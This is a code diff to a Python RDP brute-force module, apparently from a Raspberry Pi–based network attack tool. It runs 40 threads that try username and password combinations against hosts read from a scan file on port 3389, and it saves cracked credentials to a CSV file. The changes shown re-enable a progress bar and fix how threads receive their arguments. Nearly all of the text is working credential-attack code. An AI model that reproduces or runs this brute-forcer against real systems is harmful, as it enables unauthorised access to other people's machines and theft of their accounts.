@@ -8,8 +8,8 @@ import subprocess
 import threading
 import logging
 import time
-# from rich.console import Console
-# from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
+from rich.console import Console
+from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
 from queue import Queue
 from shared import SharedData
 from logger import Logger
@@ -39,7 +39,7 @@ class RDPBruteforce:
         """
         logger.info(f"Running bruteforce_rdp on {ip}:{port}...")
         return self.rdp_connector.run_bruteforce(ip, port)
-
+    
     def execute(self, ip, port, row, status_key):
         """
         Execute the brute force attack and update status.
@@ -73,7 +73,7 @@ class RDPConnector:
                 f.write("MAC Address,IP Address,Hostname,User,Password,Port\n")
         self.results = []  # List to store results temporarily
         self.queue = Queue()
-        # self.console = Console()
+        self.console = Console()
 
     def load_scan_file(self):
         """
@@ -100,7 +100,7 @@ class RDPConnector:
         except subprocess.SubprocessError as e:
             return False
 
-    def worker(self, success_flag):
+    def worker(self, progress, task_id, success_flag):
         """
         Worker thread to process items in the queue.
         """
@@ -118,13 +118,13 @@ class RDPConnector:
                     self.removeduplicates()
                     success_flag[0] = True
             self.queue.task_done()
-            # progress.update(task_id, advance=1)
+            progress.update(task_id, advance=1)
 
     def run_bruteforce(self, adresse_ip, port):
         self.load_scan_file()  # Reload the scan file to get the latest IPs and ports
 
         total_tasks = len(self.users) * len(self.passwords)
-
+        
         for user in self.users:
             for password in self.passwords:
                 if self.shared_data.orchestrator_should_exit:
@@ -135,29 +135,29 @@ class RDPConnector:
         success_flag = [False]
         threads = []
 
-        # with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%")) as progress:
-        #     task_id = progress.add_task("[cyan]Bruteforcing RDP...", total=total_tasks)
+        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%")) as progress:
+            task_id = progress.add_task("[cyan]Bruteforcing RDP...", total=total_tasks)
 
-        mac_address = self.scan.loc[self.scan['IPs'] == adresse_ip, 'MAC Address'].values[0]
-        hostname = self.scan.loc[self.scan['IPs'] == adresse_ip, 'Hostnames'].values[0]
+            mac_address = self.scan.loc[self.scan['IPs'] == adresse_ip, 'MAC Address'].values[0]
+            hostname = self.scan.loc[self.scan['IPs'] == adresse_ip, 'Hostnames'].values[0]
 
-        for _ in range(40):  # Adjust the number of threads based on the RPi Zero's capabilities
-            t = threading.Thread(target=self.worker, args=(success_flag))
-            t.start()
-            threads.append(t)
+            for _ in range(40):  # Adjust the number of threads based on the RPi Zero's capabilities
+                t = threading.Thread(target=self.worker, args=(progress, task_id, success_flag))
+                t.start()
+                threads.append(t)
 
-        while not self.queue.empty():
-            if self.shared_data.orchestrator_should_exit:
-                logger.info("Orchestrator exit signal received, stopping bruteforce.")
-                while not self.queue.empty():
-                    self.queue.get()
-                    self.queue.task_done()
-                break
+            while not self.queue.empty():
+                if self.shared_data.orchestrator_should_exit:
+                    logger.info("Orchestrator exit signal received, stopping bruteforce.")
+                    while not self.queue.empty():
+                        self.queue.get()
+                        self.queue.task_done()
+                    break
 
-        self.queue.join()
+            self.queue.join()
 
-        for t in threads:
-            t.join()
+            for t in threads:
+                t.join()
 
         return success_flag[0], self.results  # Return True and the list of successes if at least one attempt was successful
 
@@ -182,16 +182,16 @@ if __name__ == "__main__":
     try:
         rdp_bruteforce = RDPBruteforce(shared_data)
         logger.info("Démarrage de l'attaque RDP... sur le port 3389")
-
+        
         # Load the netkb file and get the IPs to scan
         ips_to_scan = shared_data.read_data()
-
+        
         # Execute the brute force on each IP
         for row in ips_to_scan:
             ip = row["IPs"]
             logger.info(f"Executing RDPBruteforce on {ip}...")
             rdp_bruteforce.execute(ip, b_port, row, b_status)
-
+        
         logger.info(f"Nombre total de succès: {len(rdp_bruteforce.rdp_connector.results)}")
         exit(len(rdp_bruteforce.rdp_connector.results))
     except Exception as e:
